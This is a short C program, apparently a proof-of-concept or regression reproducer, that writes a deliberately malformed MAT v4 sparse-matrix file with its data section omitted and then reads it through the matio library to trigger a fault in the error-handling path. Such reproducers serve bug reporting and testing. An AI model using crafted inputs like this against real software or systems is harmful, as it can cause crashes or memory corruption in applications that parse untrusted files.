#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "matio.h"

static int
write_crafted_file(const char *path)
{
    FILE *f = fopen(path, "wb");
    if ( !f )
        return 1;

    int32_t header[5];
    header[0] = 2; /* MOPT: little endian, double, sparse */
    header[1] = 2; /* mrows: nir + 1 */
    header[2] = 3; /* ncols: real sparse marker */
    header[3] = 0; /* imagf */
    header[4] = 2; /* namelen */
    fwrite(header, sizeof(int32_t), 5, f);
    fwrite("x", 1, 2, f);

    double body[4];
    body[0] = 1.0; /* ir[0], 1-based row index */
    body[1] = 5.0; /* declared row count */
    body[2] = 1.0; /* column index for the single nonzero */
    body[3] = 1.0; /* declared column count */
    fwrite(body, sizeof(double), 4, f);
    /* data section intentionally omitted so the final data read fails */

    fclose(f);
    return 0;
}

int
main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "crafted.mat";

    if ( write_crafted_file(path) != 0 ) {
        fprintf(stderr, "failed to write crafted file\n");
        return 1;
    }

    mat_t *mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( !mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    matvar_t *matvar = Mat_VarReadNext(mat);
    (void)matvar;

    Mat_Close(mat);
    return 0;
}
